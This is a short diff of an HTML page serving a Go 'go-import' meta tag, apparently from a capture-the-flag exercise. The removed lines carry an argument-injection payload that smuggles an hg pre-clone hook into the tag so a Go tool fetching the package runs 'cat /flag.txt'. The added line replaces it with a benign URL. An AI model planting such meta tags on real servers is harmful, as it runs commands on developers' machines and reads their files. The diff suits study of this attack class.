@@ -1,8 +1,1 @@
- <!DOCTYPE html>
-    <html>
-    <head>
-    <meta name="go-import" content="mahmoudgamalmmg8.github.io/evil_go/package hg --config=hooks.pre-
-  clone=cat${IFS}/flag.txt;echo${IFS}https://>/dev/null">
-    </head>
-    <body>ok</body>
-    </html>
+<meta name="go-import" content="mahmoudgamalmmg8.github.io/evil_go/package hg https://example.com/evil_go/package">
